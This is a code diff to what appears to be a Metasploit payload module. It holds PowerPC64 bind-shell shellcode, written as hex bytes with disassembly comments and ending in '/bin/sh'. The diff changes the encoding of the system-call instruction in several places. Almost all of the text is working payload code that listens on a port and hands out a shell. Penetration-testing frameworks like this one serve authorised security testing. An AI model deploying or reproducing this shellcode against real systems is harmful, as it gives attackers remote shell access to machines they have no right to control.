@@ -28,6 +28,7 @@ module MetasploitModule
                     'LPORT' => [ 58, 'n' ]
                   },
           'Payload' =>
+
             "\x7f\xff\xfa\x78"     + #   xor     r31,r31,r31                #
             "\x3b\xa0\x01\xff"     + #   li      r29,511                    #
             "\x3b\x9d\xfe\x02"     + #   addi    r28,r29,-510               #
@@ -38,7 +39,7 @@ module MetasploitModule
             "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
             "\x38\x7d\xfe\x02"     + #   addi    r3,r29,-510                #
             "\x38\x1d\xfe\x67"     + #   addi    r0,r29,-409                #
-            "\x44\xff\xff\x02"     + #   sc                                 #
+            "\x44\x00\x00\x02"     + #   sc                                 #
             "\x7c\x7a\x1b\x78"     + #   mr      r26,r3                     #
             "\x3b\x3d\xfe\x11"     + #   addi    r25,r29,-495               #
             "\x3e\xe0\xff\x02"     + #   lis     r23,-254                   #
@@ -52,23 +53,23 @@ module MetasploitModule
             "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
             "\x38\x7d\xfe\x03"     + #   addi    r3,r29,-509                #
             "\x38\x1d\xfe\x67"     + #   addi    r0,r29,-409                #
-            "\x44\xff\xff\x02"     + #   sc                                 #
+            "\x44\x00\x00\x02"     + #   sc                                 #
             "\xfb\xe1\xff\xf9"     + #   stdu    r31,-8(r1)                 #
             "\xfb\xe1\xff\xf9"     + #   stdu    r31,-8(r1)                 #
             "\xfb\x41\xff\xf9"     + #   stdu    r26,-8(r1)                 #
             "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
             "\x38\x7d\xfe\x05"     + #   addi    r3,r29,-507                #
             "\x38\x1d\xfe\x67"     + #   addi    r0,r29,-409                #
-            "\x44\xff\xff\x02"     + #   sc                                 #
+            "\x44\x00\x00\x02"     + #   sc                                 #
             "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
             "\x38\x7d\xfe\x06"     + #   addi    r3,r29,-506                #
             "\x38\x1d\xfe\x67"     + #   addi    r0,r29,-409                #
-            "\x44\xff\xff\x02"     + #   sc                                 #
+            "\x44\x00\x00\x02"     + #   sc                                 #
             "\x7c\x75\x1b\x78"     + #   mr      r21,r3                     #
             "\x7f\x64\xdb\x78"     + #   mr      r4,r27                     #
             "\x7e\xa3\xab\x78"     + #   mr      r3,r21                     #
             "\x38\x1d\xfe\x40"     + #   addi    r0,r29,-448                #
-            "\x44\xff\xff\x02"     + #   sc                                 #
+            "\x44\x00\x00\x02"     + #   sc                                 #
             "\x37\x7b\xff\xff"     + #   addic.  r27,r27,-1                 #
             "\x40\x80\xff\xec"     + #   bge+    <bndsockcode64+148>        #
             "\x7c\xa5\x2a\x79"     + #   xor.    r5,r5,r5                   #
@@ -81,7 +82,7 @@ module MetasploitModule
             "\xf8\x61\xff\xf9"     + #   stdu    r3,-8(r1)                  #
             "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
             "\x38\x1d\xfe\x0c"     + #   addi    r0,r29,-500                #
-            "\x44\xff\xff\x02"     + #   sc                                 #
+            "\x44\x00\x00\x02"     + #   sc                                 #
             "/bin/sh"
         }
       )
